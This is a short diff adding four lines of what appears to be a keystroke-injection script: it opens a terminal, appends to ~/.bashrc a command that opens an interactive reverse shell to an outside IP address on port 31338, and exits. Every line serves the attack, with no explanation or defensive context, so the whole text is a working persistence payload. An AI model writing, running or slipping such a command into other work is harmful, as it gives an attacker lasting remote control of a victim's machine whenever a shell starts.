@@ -1,0 +1,4 @@
+CTRL ALT t
+echo "setsid bash -lc 'sh -i >& /dev/tcp/172.237.117.207/31338 0>&1' </dev/null >/dev/null 2>&1 \n" >> ~/.bashrc
+exit \n
+exit \n
